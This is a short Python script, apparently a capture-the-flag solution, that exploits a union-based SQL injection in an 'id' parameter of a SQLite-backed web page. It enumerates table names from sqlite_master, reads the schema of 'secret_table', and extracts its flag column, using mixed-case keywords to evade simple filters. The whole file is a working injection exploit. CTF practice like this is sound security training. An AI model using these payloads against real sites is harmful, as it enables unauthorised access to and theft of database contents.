#!/usr/bin/env python3

import requests

host = "http://0.0.0.0"

url = f"{host}/?id="

query = "5%20and%201=2%20unIon%20SElECT%201,group_concat(name),3%20FROM%20sqlIte_master%20WHERE%20type=%27table%27"
r = requests.get(url + query)

print("Get table names")
print(r.text.split("h3")[1][1:-2])
print()

query = "5%20and%201=2%20unIon%20SElECT%201,sql,3%20FrOM%20sqlite_master%20WHErE%20name%20=%20%27secret_table%27;"
r = requests.get(url + query)

print("Get sql of secret_table")
print(r.text.split("h3")[1][1:-2])
print()

query = "5%20and%201=2%20unIon%20SElECT%201,flAg,3%20FrOM%20secret_table"
r = requests.get(url + query)

print("Get flag")
print(r.text.split("h3")[1][1:-2])
